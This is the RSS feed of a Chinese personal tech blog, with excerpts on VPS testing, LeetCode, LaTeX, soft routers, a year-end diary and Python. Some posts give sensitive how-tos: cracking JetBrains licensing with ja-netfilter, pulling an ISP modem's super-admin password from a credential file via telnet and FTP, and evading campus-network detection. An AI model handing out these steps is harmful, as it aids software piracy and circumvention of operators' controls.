<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title></title>
    <link>/</link>
    <description>Recent content on </description>
    <generator>Hugo</generator>
    <language>en</language>
    <lastBuildDate>Wed, 05 Mar 2025 00:00:00 +0000</lastBuildDate>
    <atom:link href="/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>ClawCloud使用体验</title>
      <link>/posts/%E6%96%B0%E5%85%A5clawcloud/</link>
      <pubDate>Wed, 05 Mar 2025 00:00:00 +0000</pubDate>
      <guid>/posts/%E6%96%B0%E5%85%A5clawcloud/</guid>
      <description>https://linux.do/t/topic/160305&#xA;https://linux.do/t/topic/207789&#xA;https://linux.do/t/topic/115839&#xA;前言 快毕业了忙的飞起，上个服务器到期了我都没来得及管，现在写这篇博客还是在github的pages上，又接触了一些项目，想买个便宜好使的服务器玩玩。&#xA;在论坛里搜到ClawCloud评价不错，刚好最近有活动优惠就入手了一台系统为Debian，之前一直用的ubuntu，这下也换个玩玩。记录一下机器怎么样和自己配置过程，也边以后自己看。&#xA;2C / 2G / 40G / 1T $25.20 USD 测评 部分测试结果：&#xA;VPS融合怪版本：2025.02.12&#xD;Shell项目地址：https://github.com/spiritLHLS/ecs&#xD;Go项目地址：https://github.com/oneclickvirt/ecs&#xD;---------------------基础信息查询--感谢所有开源项目---------------------&#xD;CPU 型号 : Intel(R) Xeon(R) Platinum&#xD;CPU 核心数 : 2&#xD;CPU 频率 : 2500.002 MHz&#xD;CPU 缓存 : L1: 32.00 KB / L2: 1.00 MB / L3: 33.00 MB&#xD;AES-NI指令集 : ✔ Enabled&#xD;VM-x/AMD-V支持 : ❌ Disabled&#xD;内存 : 130.84 MiB / 1.85 GiB&#xD;Swap : [ no swap partition or swap file detected ]&#xD;硬盘空间 : 911.</description>
    </item>
    <item>
      <title>菜鸡解题1</title>
      <link>/posts/leetcode/2024_09_02/</link>
      <pubDate>Mon, 02 Sep 2024 00:00:00 +0000</pubDate>
      <guid>/posts/leetcode/2024_09_02/</guid>
      <description>关键：题目中关键信息 题解：自己或别人的解题思路 特解：这道题使用特殊方法 Get：学到的点 2869. 收集元素的最少操作次数 题解：从数组末端开始，标记数组，只有小于K的去求余标记，然后求和查一下是不是全1。全1返回结果&#xA;class Solution(object): def minOperations(self, nums, k): &amp;#34;&amp;#34;&amp;#34; :type nums: List[int] :type k: int :rtype: int &amp;#34;&amp;#34;&amp;#34; flag = [0] * k for i in range(len(nums)-1, -1, -1): if nums[i]&amp;lt;=k: flag[nums[i]%k] = 1 if sum(flag) == k: return len(nums)-i 题解：创建k的集合从集合里删除数字，为空返回。&#xA;2974. 最小数字游戏 关键：bob先加入arr，Alice后加。为什么要刻意强调数组是偶数长度？&#xA;特解：排序后两两交换大的在前。&#xA;class Solution(object): def numberGame(self, nums): &amp;#34;&amp;#34;&amp;#34; :type nums: List[int] :rtype: List[int] &amp;#34;&amp;#34;&amp;#34; nums.sort() for i in range(0, len(nums), 2): nums[i], nums[i + 1] = nums[i + 1], nums[i] return nums Get：pop时候从后往前删，不然会越界。</description>
    </item>
    <item>
      <title>JetBrains 全家桶破解</title>
      <link>/posts/play_time/jetbrains%E5%85%A8%E5%AE%B6%E6%A1%B6%E7%A0%B4%E8%A7%A3/</link>
      <pubDate>Wed, 30 Aug 2023 00:00:00 +0000</pubDate>
      <guid>/posts/play_time/jetbrains%E5%85%A8%E5%AE%B6%E6%A1%B6%E7%A0%B4%E8%A7%A3/</guid>
      <description>突然想开发了我的 IDEA 还是 2021 的，IDEA 和 Pycharm 还在机械硬盘，装个最新的到固态里面。教育邮箱懒得申请了，失效了又要麻烦续杯。写出来记录一下以后自己参考。&#xA;所提供的内容仅供学习交流使用,严禁用于商业用途,请于下载后24小时内删除。&#xA;准备 破解使用的是 ja-netfilter：https://gitee.com/ja-netfilter/ja-netfilter。release 下载以后解压。&#xA;config 配置文件默认为空，需要添加一些配置。plugins 是可以加载一些其他联动插件，本文使用的方法不用其他插件。&#xA;找到 IDEA 或者 Pycharm 的 Help &amp;mdash;&amp;gt; Edit Custom VM Options 添加启动参数，路径是ja-netfilter的 jar 包路径。&#xA;-javaagent:C:\\path\\to\\ja-netfilter.jar Jetbrain全家桶在2022.2版本以上默认启用Java17，所以用的时候需要在 VM Options 里额外增加下面两行参数。&#xA;--add-opens=java.base/jdk.internal.org.objectweb.asm=ALL-UNNAMED&#xD;--add-opens=java.base/jdk.internal.org.objectweb.asm.tree=ALL-UNNAMED 在这里修改的 VM Options 配置文件路径是 C 盘下的本版本全局配置，也可以修改添加到安装目录下的 bin 目录中的 idea64.exe.vmoptions 配置文件。&#xA;修改其他配置 修改 config 修改文件夹下的&#xA;congig/url.conf&#xA;[URL]&#xD;PREFIX,https://account.jetbrains.com/lservice/rpc/validateKey.action&#xD;PREFIX,https://account.jetbrains.com.cn/lservice/rpc/validateKey.action congig/dns.conf&#xA;[DNS]&#xD;EQUAL,jetbrains.com 激活 使用 power 插件 power 插件被作者成为非对称加密的屠龙刀，这种方式激活可以自定义信息，并且可以设置全家桶激活。&#xA;参考大佬博客文章 本地运行两个 python 文件，一个用于生成本地证书签名文件&#xA;import datetime from cryptography import x509 from cryptography.</description>
    </item>
    <item>
      <title>LaTex数学公式</title>
      <link>/posts/latex%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/</link>
      <pubDate>Sun, 21 May 2023 00:00:00 +0000</pubDate>
      <guid>/posts/latex%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/</guid>
      <description>https://blog.csdn.net/m0_55746113/article/details/122728673&#xA;标注符号 上下标 上标符号为“^”、下标符号为“_” ，多于一个字符用{}包含，例如2^r、a_5&#xA;$2^r,a_5,A_{n+1}$&#xA;平均值、箭头、向量等 加^号：\hat{x}&#xA;加横线：\overline{x}&#xA;加^：\widehat{x}&#xA;加波浪线：\widetilde{x}&#xA;加一个点：\dot{x}&#xA;加两个点：\ddot{x}&#xA;$\hat x,\overline x,\widehat x,\widetilde x,\dot x,\ddot x$&#xA;加粗 矩阵字母一般会用加粗的罗马体来表示。\bf&#xA;根号 \sqrt{}&#xA;希腊字母表 运算符号 加减乘除 + 和 -。\times 和 \div。点乘用 \cdot&#xA;$ +,-,\times,\div,\cdot$&#xA;大于、小于、约等于 大于小于直接 &amp;gt; 、 &amp;lt;&#xA;大于等于 \ge，小于等于 \le&#xA;远大于 \gg，远小于 \ll&#xA;不等于 \ne&#xA;约等于 \approx&#xA;$&amp;gt;,&amp;lt;,\ge,\le,\gg,\ll,\ne,\approx$&#xA;分式和根式 \frac{分子}{分母}或\frac 分子 分母。如&#xA;$ \frac{1}{2}$&#xA;交集并集 交集用 \cap&#xA;并集用 \cup&#xA;$\cap,\cup$&#xA;属于不属于 属于用 \in&#xA;不属于用 \notin&#xA;$\in,\notin$&#xA;省略号 横向省略号 \cdots</description>
    </item>
    <item>
      <title>软路由日记(一)</title>
      <link>/posts/play_time/%E8%BD%AF%E8%B7%AF%E7%94%B1%E6%97%A5%E8%AE%B0%E4%B8%80/</link>
      <pubDate>Fri, 03 Feb 2023 00:00:00 +0000</pubDate>
      <guid>/posts/play_time/%E8%BD%AF%E8%B7%AF%E7%94%B1%E6%97%A5%E8%AE%B0%E4%B8%80/</guid>
      <description>前言 在学校疫情期间买了一个 j4125 的软路由，一直等到回家过了很久才到手，因为买的是裸机，还有些配件是在别的店买的，回家以后发现地址只能在区以内修改，只能取消订单重新下了单。&#xA;最后的配件列表如下：&#xA;DDR4 8G * 2 128G msata * 1 金士顿 480G sata * 1 （送的有sata的电源线和数据线，要注意下电源线用那种带拐角的，不然不好插上去） DV 12V5A 电源 5.5mm 原来咸鱼上买了假三星内存条回来插上发现不能用，所以把笔记本上的两根 8G 换下来了，然后又觉得电脑单根有点卡，所以又下了一单，哈哈哈现在电脑上是假三星 32G。电源是发货最慢的，我把家里路由器机顶盒的电源找了个遍，发现都插不上去，重要的是同样是圆口的插孔，还分好多不一样的尺寸，这个是最大的 5.5mm 的，最后出去找了一家买监控的店，在压箱货里面找到了一个非常非常塑料感的电源，卖了我 30 块，我现在还记得我进去的时候老板正在玩魔兽骑着坐骑跑路。&#xA;再安利两个视频，我前期了解主要通过这两个 up 的视频学习的。&#xA;保姆级J4125英特尔2.5G安装PVE+Ikuai+Openwrt&#xA;用U盘直接给J4125软路由安装OpenWrt固件，超简单小白也看得懂&#xA;准备材料 需要准备：&#xA;U盘一个。制作引导盘，安装完成以后可以恢复 键盘。安装向导需要一些配置 网线。安装完成以后可以访问 web页面配置 软件安装包：&#xA;Restful。官网：http://rufus.ie/zh/ pve镜像。官网：https://www.proxmox.com/en/downloads。要下载名称有 ISO Installer 才是系统镜像文件 Restful 制作安装 插上U盘，打开 Restful 写入镜像文件，设备选择U盘盘符，引导类型选择镜像文件，然后右边选择下载好的 PVE 镜像文件，其他的配置默认即可。&#xA;确认以后会有一个弹窗选择 DD 镜像模式写入。用个网上找的图片&#xA;引导盘算制作好了。如果引导盘安装完成以后想要恢复成原来U盘，插上U盘，注意一下识别的盘符，引导类型选择为非可引导重新格式化一下即可，文件系统 FAT32 不能写入超过 2G 大小的文件，所以我一般选 NTFS。&#xA;虚拟机网段规划分配 因为安装的时候需要配置 PVE 网络的网关，既然用了软路由肯定是要用 OpenWrt、爱快这种路由系统装到虚拟机里，所以在安装之前先规划一下虚拟机的 IP 分配问题。以我安装的 OpenWrt 为例。</description>
    </item>
    <item>
      <title>中国联通SK-D748光猫超级密码获取</title>
      <link>/posts/play_time/%E4%B8%AD%E5%9B%BD%E8%81%94%E9%80%9Ask-d748%E5%85%89%E7%8C%AB%E8%B6%85%E7%BA%A7%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96/</link>
      <pubDate>Wed, 04 Jan 2023 00:00:00 +0000</pubDate>
      <guid>/posts/play_time/%E4%B8%AD%E5%9B%BD%E8%81%94%E9%80%9Ask-d748%E5%85%89%E7%8C%AB%E8%B6%85%E7%BA%A7%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96/</guid>
      <description>折腾软路由百忙之中抽时间来简单水一篇。&#xA;有这个需求是因为目前在家里是用另一个无线路由器桥接联通的光猫的，但是在dhcp 里死活找不到桥接路由器分配的 ip，然后插上软路由竟然又把 ip 分配给软路由了，真是不服不行。&#xA;之前装联通宽带的时候尝试过找师傅要超级管理员的密码，但是师傅给我打哈哈糊弄过去了，给的一个普通 user 用户并没有静态 ip 的权限，所以就去网上找教程了，自己记录一下。&#xA;原文地址：https://www.right.com.cn/forum/thread-8253868-1-1.html&#xA;设备型号 SK-D748-C&#xA;第一步 保证可以局域网内正常访问联通光猫的管理界面。比如我的光猫地址为 192.168.1.1&#xA;第二步 打开隐藏配置界面：http://192.168.1.1/hidden_version_switch.html&#xA;勾选图中的 Telnet Enable 选项，网页会刷新一下，接下来测试一下光猫的 telent 是否成功打开。&#xA;开始 - 运行 - cmd，运行 telnet 192.168.1.1 提示输入登陆用户名称视为成功。&#xA;第三步 使用 ftp 连接光猫，默认的账号密码是 useradmin/useradmin ，在 /var/tmp 目录下的 telnet_su_passwd 文件就是管理员密码。&#xA;我最后获得的密码格式是：前半段是光猫默认的 wifi 密码，从 CUAdmin 开始到后面一串数字是超级管理员的登陆密码&#xA;超级管理员用户名是 CUAdmin&#xA;其他说明 不要尝试在 ftp 里随意删除软件，可能导致设备异常 获取超级管理员权限后，修改任何设置前自行评估有无风险。 </description>
    </item>
    <item>
      <title>2022年度总结</title>
      <link>/posts/annual/2022%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/</link>
      <pubDate>Sat, 31 Dec 2022 00:00:00 +0000</pubDate>
      <guid>/posts/annual/2022%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/</guid>
      <description>今年过得可真是太快了，不知道从哪开始写。前几天不小心点开微博，首页一句话想想只能苦笑一下，所有人应该都过得差不多吧。今年我乱过的，明年我一定好好过。&#xA;学业 可能到现在也不知道当时为了什么考研，可能就是觉得听了大环境下找工作不容易，自己觉得在本科学校体验不太好，想上个像样的大学，考前一阵子还记得说过：XXX（自己学校）狗都不来，现在调剂回本校了，到考前一天所有的书可能连一遍都没过完，数学只能说本科那几门都没整明白。本来目标也没多高，到调剂的时候一降再降，算了，有学上就行不挑了。&#xA;现在只要是个计算机专业研究生基本上都逃不过人工智能的大门，无论是什么方向都会往上面靠，可能这就是大势所趋吧，我反正只能提起半个兴趣，也许我对所有东西都只能提起半个兴趣。人工智能又是和数学挺有关联的，自己考研数学都没整好，现在学的一门人工智能数学真的是边看边摇头。出来混迟早要还的。&#xA;然后学校的培养计划是学硕专硕都要发文章，本来自己的表达能力都不太行，又想了想自己本科的毕业设计论文，既来之则安之吧。&#xA;新冠疫情 好像就是今年年初的时候开开始全员核酸，然后大四最后在学校基本上过两天就要下去排个队，然后学校组织的又不行，基本上一下去就要一个半小时在那站着，所以我基本上都是踩着尾去的。今年过得如此的快跟这个全员核酸和封闭逃不了干系，天天坐在屋子里面，一晃一天过去了，天天就跟乌龟一样都没动过，自己也没怎么运动过。&#xA;然后年底阵子封控放开了，家里亲戚和认识的人基本都阳了个遍，我在家发烧了两波，刚好还都是在线上考试之后，有一晚上真是烧的顶不住了，半夜起来手机放旁边听歌还觉得好受了点，写这篇总结的时候已经差不多完全好了。就这样吧，反正也放开了，以后说不定就再也没有新冠疫情导致各种封闭了，在后头的好日子应该快来了吧啊？&#xA;家人 之前还会担心爸妈会在我不在家的时候家里闹矛盾什么的，现在感觉爸妈快退休了还是心态变了，现在俩人也会吵就是很快就笑了，这样子我在学校的时候也不会太担心了，总之确实跟之前也有很大的变化，希望身体都健健康康的就好。&#xA;我姐年底的时候出国读博了，就如我姐之前说的她是真的惨，从幼儿园开始连着上了 30 年学，不过这应该也就是最后了，以她的专业，只要能顺利毕业接下来真就是好日子了。&#xA;毕业 现在想想有点怀念本科最后做毕设那会，事也不算多，和其他的好几个宿舍天天都有联动活动，有点想起来小时候跟发小在外面疯一样，那种感觉真的是久违了。宿舍里两个去工作了，剩下三个考研只有我姑且算是考上了，但是我感觉他们每一个都比我努力的多，今年也都二战了，在这里祝他们都成功上岸吧，以后各自也都有自己的路要走了，这一次分别谁知道一下次会在哪见面，各位天山路远，山高水长，后会有期，江湖再见。&#xA;感情 算是失败过一次吧，但是也不算，反正现在性格小开阔一下，至少不像之前那样跟没见过女人一样 (😎👉😭🕶️) 年纪也快到了，爸妈开始正式跟我说这个问题了，之前从来都是闭口不谈，还声称我谈恋爱给我恋爱经费，但是我一个臭打游戏的，买个游戏都要蹲打折才行，这一点也得改一改。然后就是确实有点不懂人情世故，我要是女的我都觉得这个人看起来不太聪明有点妈宝的感觉。以后一个一个改吧，不然真就是相亲硬过日子了，感觉自己也是条件不咋地要求还挺高，到现在也没遇到真能豁出去的，自己也要胆大一些。&#xA;自己的想法 昨天晚上高中同学回来了，一起遛弯聊了聊，他对他现在的工作挺不满意的想换了，想了下我再过两年就也该找工作了，但是天天只顾得上自己学和玩，除了程序员这一条路，其他能干啥也不知道，等到时候年纪大了被顶掉了咋办？确实想太多也会让步伐变慢，带着这个问题等遇到新信息再想吧。我也又一次确认了一下自己努力的目标就是为了到将来的时候能过得轻松点就很满足了。&#xA;最近几个月买了个软路由，还应验了之前一篇文章里写的，过年别人在出去吃喝，我在家里折腾黑盒子，问我收获了什么，就是组了一个 all in one 看视频不要广告 blablabla，自己随地就可以魔法，父母只是沉默不语，看着自己家的电表转的又快了。哈哈哈&#xA;自从从去年7 8月份加入了实验室吧，我就每天把自己安排的满满当当，从早上到晚上每一件事都用尽全力，不管是打游戏还是去学习和折腾些技术，感觉一点其他的时间都没有给自己留，一直都是火力全开往前走也没有停下来好好想一想，前几天在电视上也看到了一个广告，一个老奶奶教自己孙女画画说道：“画画要留白，人生也一样，不要把生活填得太满，多给自己留些空间”。也觉得这样排的满满当当自己有点吃不消了，而且好多东西也有点力不从心，开始变得有些木讷了，明年就先学学会劳逸结合，但是效率还是不能丢。&#xA;现在是 22年12月31日23点25分，赶在这一年的最后把总结写出来了，就这样吧，今年确实过得听梦幻的，最近这三年都听梦幻的，翻了一遍相册也是没有什么大事可回忆的，平平淡淡也挺好的吧。&#xA;再见 2022 ！</description>
    </item>
    <item>
      <title>ZUT 使用路由器连接校园网</title>
      <link>/posts/play_time/zut-%E4%BD%BF%E7%94%A8%E8%B7%AF%E7%94%B1%E5%99%A8%E8%BF%9E%E6%8E%A5%E6%A0%A1%E5%9B%AD%E7%BD%91/</link>
      <pubDate>Tue, 11 Oct 2022 00:00:00 +0000</pubDate>
      <guid>/posts/play_time/zut-%E4%BD%BF%E7%94%A8%E8%B7%AF%E7%94%B1%E5%99%A8%E8%BF%9E%E6%8E%A5%E6%A0%A1%E5%9B%AD%E7%BD%91/</guid>
      <description>前言 我们学校的校园网不光每个月要宽带费 20/月，而且要绑定一个校园卡，我的一个月月租下来要 49/月，而且校园网还限制设备数量只能连接一个，我一般都是电脑连校园网，手机用流量，但是教职工的校园网就可以两个设备连接，寝室里目前有6+个设备也需要联网，商量以后打算搞个路由器贡献一个账号连校园网开 wifi，之前就见贴吧有老哥已经成功了，所以自己也尝试一下做个记录，给以后的同学看也不错。由于我已经连好路由器了，所以部分图片取自网络图片作为参考，我也尽量说的详细些。&#xA;对于任何硬件、软件的损坏，本人没有赔偿的责任，哪怕这样的后果是因教程中的错误造成的。也请认真对待每一步操作，也许因为你的操作不当硬件因此变成一块砖。另外本教程的操作会使你的路由器失去保修。 本篇文章仅起指导性的作用，在操作的过程中遇到的问题也许我也没有遇到过，请先自行尝试解决，如果我有空也会尽量帮助。 学校明令禁止安装路由器，本人绝对没有怂恿或建议任何同学安装路由器，本人安装路由器的行为完全属于个人意志，仅仅作为个人的学习技术交流，请读者在安装好路由器之后 24 小时内再将之拆除，请按照学校指明的方式连接到互联网。如果学校根据校规等文件追究责任，与本人无关。 叠甲过&#xA;前置知识 校园网插入网线认证是要模拟 Dr.com 软件的发包认证，除了账号密码认证校园网以外，软件还会定时发送心跳包保证校园网连接。&#xA;zut 的校园网认证格式为账号：\r\n你的学号@[unicom|telecom|cmcc] ，其中 @ 后面的是你的运营商，对照前面的格式分别为：联通、电信、移动，例如我的是联通校园网，账号就是：\r\n2022********@unicom，密码就是你自己的密码。&#xA;zut 校园网的客户端版本为：6.0.0（P）&#xA;校园网的防检测插件原理还没有写，自己用的 小米4C 是社区固件资源中自带的。想看原理可以看最后挖坑部分&#xA;需要的材料 本教程使用的路由器型号 Xiaomi router 4c pdd二手35，安装的系统 openwrt。请注意：路由器的选择直接影响到你后面的操作，我专门在网上挑了好久选的这个路由器，但是，唯独这个路由器的社区资源最特殊，本人也是经过各种尝试才成功。如果选择其他路由器，本教程中的主要安装思路相同，但是需要自行寻找适合自己路由器的固件资源。&#xA;路由器。 网线两根。一根我买的8m的，因为宿舍AP在门上面，另一根需要连接路由器和电脑，长度自己看。 开通校园网的账号。 自己思考的能力。 需要的软件压缩包：zut_Xiaomi_router_4c.zip。其中包含 dogcom.zip。用来进行校园网模拟拨号，定时发送心跳包的工具。 R3GV2 patches.zip。刷机的主要部分包含了：R3GV2 patches（前期连接路由器的工具）、Mi4C.bin（小米 4c 的 openwrt 固件自带防检测插件）、breed.bin（breed web 恢复控制台） MobaXterm_Portable.zip。用来连接路由器和传输文件的软件 小米路由器4C恢复官方固件工具包.zip。刷成砖的官方补救措施 教程参考的网站或资料 贴吧老哥的教程：https://tieba.baidu.com/p/7760362347 广东工业大学在 github 上的教程：https://github.com/shengqiangzhang/Drcom-GDUT-HC5661A-OpenWrt 【记录】小米路由器 4C 刷机过程：https://github.com/shengqiangzhang/Drcom-GDUT-HC5661A-OpenWrt/issues/27 R4CM，说说我的小米路由器4C刷机过程：不用Linux也不用虚拟机…… ：https://www.right.com.cn/FORUM/thread-4047571-1-1.html 路由器认证校园网drcom：https://www.brothereye.cn/router/669/ 开工 接通路由器电源，使用网线连接路由器，进入初始化管理页面通常是 192.168.1.1，能跳过就跳过，下图右选择无需拨号即可。（网络图片仅供参考）&#xA;接下来设置 wifi 名称和密码，可以勾选管理密码和 wifi 密码相同的框，保存以后会提示新的管理后台地址，通常是 192.168.31.1，使用管理密码登陆以后，显示路由器界面就算初始化成功。&#xA;刷入不死 Breed Breed 是国内个人 hackpascal 开发的闭源 Bootloader（引导加载器，即为用于加载操作系统的程序），也被称为“不死鸟”。 因为有些官方升级固件自带 bootloader，如果从官方固件升级，会导致现有 bootloader 被覆盖。而当 Breed 更新固件时，它会自动删除固件附带的引导加载程序，因此可以防止 Breed 被覆盖。</description>
    </item>
    <item>
      <title>KKapi&#43;ISpeak说说页面部署</title>
      <link>/posts/play_time/kkapi&#43;ispeak%E8%AF%B4%E8%AF%B4%E9%A1%B5%E9%9D%A2%E9%83%A8%E7%BD%B2/</link>
      <pubDate>Tue, 04 Oct 2022 00:00:00 +0000</pubDate>
      <guid>/posts/play_time/kkapi&#43;ispeak%E8%AF%B4%E8%AF%B4%E9%A1%B5%E9%9D%A2%E9%83%A8%E7%BD%B2/</guid>
      <description>前言 感觉原来的 Artitalk 说说不好康，在开往里发现好多博客都用的说说功能叫叨叨点啥，看了看作者的说说页面，可以插入图片和标签分类，还有仅自己可见的功能，感觉挺不错的（实际是自己想折腾）所以就整一个。自己在部署过程中实在是踩了不少的坑，而且作者的文档感觉写的也不算完善，所以打算自己记录一下。&#xA;项目结构 作者的文档中各种仓库链接属实给我跳晕了，最后理出来的项目分为以下部分：&#xA;kkapi。是作为说说的后端部分，连接 MongoDB 数据库，还有一个kkadmin的管理页面 ISpeak。说说的主体部分，依赖于后端的 kkapi ，分为前端的展示页面，和一个对接后端的发布说说页面。 作者文档中给出很多部署方法，白嫖版的就是 vercel 后端 api + 管理界面 + MongoDB 提供的云服务，但是个人感觉 vercel 经常被墙，所以部署的 api 感觉也不会稳定，而且考虑到数据的存放问题，所以我选择的是都部署到自己服务器上。&#xA;后端部署 Docker 安装 Mongodb 安装可以参考菜鸟教程的 Docker 安装 MongoDB 。因为之前听过 MongoDB 的未授权访问，所以考虑到安全性问题，创建容器的时候添加 MONGO_INITDB_ROOT_USERNAME 和 MONGO_INITDB_ROOT_PASSWORD 设置用户的账号密码，开启Docker MongoDB 的身份验证。考虑到数据未来的迁移可以通过 -v 挂载宿主机的一个目录。可以修改默认端口再减少一些风险。最后我启动的命令如下&#xA;docker run -d --name mongodb \ -p xxxxx:27017 \ -v /my/own/datadir:/data/db \ -e MONGO_INITDB_ROOT_USERNAME=mongoadmin \ -e MONGO_INITDB_ROOT_PASSWORD=secret \ --restart=always mongo 之后可以使用工具测试一下连接。&#xA;kkapi 部署 和项目文档中的教程差不多，要注意使用的 node 版本请高于 16.</description>
    </item>
    <item>
      <title>友链</title>
      <link>/friends/</link>
      <pubDate>Sat, 10 Sep 2022 16:26:47 +0800</pubDate>
      <guid>/friends/</guid>
      <description>懒狗 Braindance为世界上所有的美好而战&#xA;交换友链 想互换友链就留言吧～格式参考如下～&#xA;name: Braindance link: https://www.penginman.com avatar: https://www.penginman.com/img/avatar.png descr: 为世界上所有的美好而战 </description>
    </item>
    <item>
      <title>说说</title>
      <link>/shuoshuo_del/</link>
      <pubDate>Sun, 28 Aug 2022 12:07:56 +0800</pubDate>
      <guid>/shuoshuo_del/</guid>
      <description> </description>
    </item>
    <item>
      <title>关于</title>
      <link>/about/</link>
      <pubDate>Sun, 28 Aug 2022 11:58:42 +0800</pubDate>
      <guid>/about/</guid>
      <description>为世界上所有的美好而战</description>
    </item>
    <item>
      <title>近期总结</title>
      <link>/posts/%E8%BF%91%E6%9C%9F%E6%80%BB%E7%BB%93/</link>
      <pubDate>Wed, 10 Aug 2022 18:39:26 +0800</pubDate>
      <guid>/posts/%E8%BF%91%E6%9C%9F%E6%80%BB%E7%BB%93/</guid>
      <description>水一篇文章，写写最近干了啥&#xA;Onenav 一直想找一个导航页的网站，自己天天用书签栏用的找不到太烦了。之前用过webstack主题的网站，本来是直接写源码上的，后来自己做了一个用js读配置文件加载的，但是加网站的时候要手改数据文件。 最后发现了正在用的导航页onenav&#xA;OneNav是一款开源免费的书签（导航）管理程序，使用使用PHP + SQLite 3开发，界面简洁，安装简单，使用方便。OneNav可帮助你你将浏览器书签集中式管理，解决跨设备、跨平台、跨浏览器之间同步和访问困难问题，做到一处部署，随处访问。&#xA;这个程序提供了后台管理的面板，添加网站的时候也能自己识别网站的title和description，还提供了好几个主题。下面是我网站的一部分，总之用起来还挺不错 踩的坑：官方文档里只提供了两个网站，但是在演示站找到了五六个，官方也提供了主题的下载和配置，但是需要订阅服务一年19.9，因为我是白嫖怪，就自己去找源码了&#xA;baisu&#xA;baisu-two&#xA;Webstack&#xA;找到源码需要改主题的资源地址，主题默认使用的onenav的旧变量TEMPLATE&#xA;&amp;lt;script src=&amp;#34;templates/&amp;lt;?php echo TEMPLATE; ?&amp;gt;/js/jquery-3.5.1.min.js&amp;#34; type=&amp;#34;text/javascript&amp;#34; charset=&amp;#34;utf-8&amp;#34;&amp;gt;&amp;lt;/script&amp;gt; 最新版本已经不再使用配置文件中的TEMPLATE转而为$template存储，修改以后样式就正常加载了。&#xA;域名 一直因为没有一个com的域名感到遗憾，最近看间谍过家家，记得阿尼亚和玩偶玩过家家的时候，有一只企鹅的名字就叫：[ペんぎんマン ]^(penginman)并且pingin的日语发音和企鹅penguin相似。于是有了这个域名 www.penginman.com&#xA;mdserver-web mdserver-web&#xA;简单的Linux面板,感谢BT.CN写出如此好的web管理软件。我一看到，就知道这是我一直想要的页面化管理方式。 复制了后台管理界面，按照自己想要的方式写了一版。&#xA;一个把宝塔面板样式照搬过来的Linux管理面板，感觉现在也不是特别成熟，但是其他面板也没有太顺手的，为什么不用宝塔面板，因为之前报过关于网传信息泄露问题，我就是洁癖精。&#xA;图床 之前用过一个Chevereto的图床，但是在国内服务器上部署，然后不想域名备案，所以访问老有问题。心血来潮在github上搜到了这两个项目&#xA;Lsky Pro&#xA;PicX&#xA;Lsky Pro 这个主要发现支持对象存储，之前有篇文章说以后已经把网站的图片存到腾讯云COS了，所以用这个主要充当一个图床上传的工具，还加了一个本地存储策略随便存点东西。上传以后也是可以复制各种类型。 还可以在后台直接管理图片。具体的就看仓库的演示图吧。&#xA;PicX 这个用来传一些不大重要的图片把，也算是能用，还是用github当图床的，只是jsdelivr国内经常挂，所以加了两个其他的CDN访问。&#xA;显示器 开始觉得屏幕小了，也去换了个眼镜还是感觉不好使，上一个眼镜看东西已经有点白了，主要是打派找人太费劲了，而且已经研究生了，未来看文献也挺不错，打算奖励一个显示器爽爽。去网吧体验了一波27寸，又在网上恶补了一阵子知识，最后相中了AOC Q27G2S/D，趁着打折入了手，买东西的时候还发现京东太会了，我下了个单想看看哪个支付方式能再优惠点就取消，取消的时候选择了少用优惠券，弹出来的页面又领了50块大洋！！！😎😎😎又省一波。 到手送的一跟DP线，发现电脑没有口，只有一个HDMI和两个Mini DP，家里有一根HDMI的好像有问题，帧数高的时候就会花，又在网上买了一个Mini DP转DP，还是同一个快递员给我送的，快递员还认出来我了，怪不好意思的。&#xA;Markdown编辑器 最近发现Typora老版本不能用了，而且官方出了正式版需要付费，就找另外找了几个软件：&#xA;Notion 这个软件感觉用来每个段落排版比较不错，但是windows端是个网页的套壳，而且国内正常好像还访问不了，用过一阵子换了 Obsidian 也挺不错的软件，可以在多个文章直接加上双向链接，还有脑图什么的，而且开源的插件社区，但是就是因为功能太多了感觉有点复杂 MarkText 很清爽的一个界面，但是目前还没支持中文。 Joplin 最后选择用的。界面清爽、管理笔记也挺不错，主要发现了有可以自己部署私有云笔记，下一步折腾这个。 软路由 先放一个骚话生成器项目里的模板&#xA;快过年了，不要再讨论什么NAS、HTPC、OpenWrt之类的了。你带你的大机箱回到家并不能给你带来任何实质性作用，朋友们兜里掏出一大把钱吃喝玩乐，你默默的在家里摆弄你的破群晖。亲戚朋友吃饭问你收获了什么，你说我组了一个RAID 0的ALL IN ONE，亲戚们懵逼了，你还在心里默默嘲笑他们，笑他们不懂你的刮削器，不懂你的Auto Backup，也笑他们看爱奇艺还要忍受会员专属广告。你父母的同事都在说自己的子女一年的收获，儿子买了个房，女儿买了个车，姑娘升职加薪了，你的父母默默无言，说我的儿子装了个黑盒子，开起来嗡嗡响、家里电表走得越来越快了。&#xA;我感觉我要走前辈走过的路了，所以还有个念想就是整一个ALL IN ONE耍一耍，目前没有资金，看中了一个N5105的小主机标价888，等研究生发现工资了，整一个鼓捣鼓捣。</description>
    </item>
    <item>
      <title>Python-Day-100 笔记</title>
      <link>/posts/python%E7%AC%94%E8%AE%B0/</link>
      <pubDate>Mon, 06 Jun 2022 00:00:00 +0000</pubDate>
      <guid>/posts/python%E7%AC%94%E8%AE%B0/</guid>
      <description>函数 函数的参数 可以使用可变参数def func(*args)，参数前面的*代表args是一个可变参数。&#xA;用模块管理函数 每个文件代表一个模块，不同模块的函数命名可以相同，但是如果如下代码引用&#xA;from module1 import foo from module2 import foo foo() 程序会调用最后一个调用的foo函数。 如果导入模块中除了定义的函数以外有可执行的代码，则Python解释器在导入这个模块时就会执行这些代码。可以利用只有被Python解释器直接执行的模块的名字才是 __main__ 进行判断&#xA;def foo(): pass # __name__是Python中一个隐含的变量它代表了模块的名字 # 只有被Python解释器直接执行的模块的名字才是__main__ if __name__ == &amp;#39;__main__&amp;#39;: print(&amp;#39;call foo()&amp;#39;) foo() 在其他模块再导入上述模块时，if条件中的语句就不会执行&#xA;变量作用域 Python查找一个变量时会按照“局部作用域”、“嵌套作用域”、“全局作用域”和“内置作用域”的顺序进行搜索。内置作用域及python内置的标识符如：input、print、int。 